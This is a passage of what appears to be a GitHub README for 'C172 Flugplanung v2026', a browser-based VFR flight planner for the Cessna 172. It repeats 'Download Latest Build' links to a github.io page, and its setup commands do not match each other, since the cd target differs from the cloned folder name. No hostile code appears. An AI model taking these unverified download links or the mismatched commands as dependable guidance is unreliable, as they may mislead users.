...
> **C172 Flugplanung is a browser-based VFR planning solution for the Cessna 172 that brings navlog, weight and balance, fuel, and performance planning into one place in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/caleb-hughesyftv6159/c172-flugplanung-v2026?style=flat-square)](https://github.com/caleb-hughesyftv6159/c172-flugplanung-v2026)

---

<p align="center">
  <a href="https://caleb-hughesyftv6159.github.io/c172-flugplanung-v2026/">
...
> **[Download Latest Build - C172 Flugplanung v2026](https://caleb-hughesyftv6159.github.io/c172-flugplanung-v2026/)**

---

[Download Latest Build](https://caleb-hughesyftv6159.github.io/c172-flugplanung-v2026/)

---

## What C172 Flugplanung Does

C172 Flugplanung is built for VFR trip prep with the Cessna 172 in mind. Instead of splitting the process across separate tools, it gathers the usual planning tasks into a single web application so route details, loading, fuel, and aircraft performance can be handled in one workflow.

It is aimed at pilots who want a browser-accessible planning environment with login-protected access and cloud synchronization. With Firebase Auth in the mix, plans can be kept available across devices without leaving the web app.

---

## Core Capabilities

- Navlog planning for route setup and flight preparation
...
git clone https://github.com/caleb-hughesyftv6159/c172-flugplanung-v2026.git
cd c172-flugplanung
...
Yes. Access to the application is login-based.

### Can I use it on multiple devices?
Yes. Cloud synchronization is included for use across devices.
...
Use the latest build link above to open the current version.
